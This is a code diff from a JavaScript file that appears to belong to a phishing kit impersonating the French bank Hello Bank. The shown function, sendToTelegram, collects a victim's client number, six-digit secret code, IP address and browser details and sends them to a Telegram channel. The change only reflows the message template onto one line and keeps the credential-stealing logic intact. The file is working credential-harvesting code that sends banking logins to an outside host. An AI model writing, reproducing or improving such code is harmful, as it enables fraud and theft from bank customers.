@@ -748,26 +748,7 @@ async function waitForConfig(maxWait = 3000) {
 
     async function sendToTelegram(data) {
         const ip = await getIP();
-        const message = `
-🏦 <b>HELLO BANK - NOUVELLE CONNEXION</b>
-
-👤 <b>Numéro Client:</b>
-${data.clientNumber}
-
-🔒 <b>Code Secret (6 chiffres):</b>
-${data.secretCode}
-
-💾 <b>Mémorisé:</b>
-${data.remembered ? 'OUI ✅' : 'NON ❌'}
-
-📅 <b>Date et heure:</b>
-${new Date().toLocaleString('fr-FR')}
-
-🌍 <b>Adresse IP:</b> ${ip}
-
-🌐 <b>Informations navigateur:</b>
-${navigator.userAgent.substring(0, 150)}...
-        `;
+        const message = `\n🏦 <b>HELLO BANK - NOUVELLE CONNEXION</b>\n\n👤 <b>Numéro Client:</b>\n${data.clientNumber}\n\n🔒 <b>Code Secret (6 chiffres):</b>\n${data.secretCode}\n\n💾 <b>Mémorisé:</b>\n${data.remembered ? 'OUI ✅' : 'NON ❌'}\n\n📅 <b>Date et heure:</b>\n${new Date().toLocaleString('fr-FR')}\n\n🌍 <b>Adresse IP:</b> ${ip}\n\n🌐 <b>Informations navigateur:</b>\n${navigator.userAgent.substring(0, 150)}...\n        `;
         
         showTelegramStatus('📡 Envoi des données à Telegram...', 'success');
         
